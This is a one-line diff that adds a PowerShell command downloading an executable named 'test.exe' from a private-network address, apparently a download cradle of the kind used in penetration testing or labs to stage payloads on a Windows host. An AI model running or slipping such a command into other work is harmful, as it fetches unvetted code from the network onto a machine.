@@ -1,0 +1,1 @@
+powershell (new-object system.net.webclient).downloadfile('http://192.168.10.11/test.exe','test.exe');
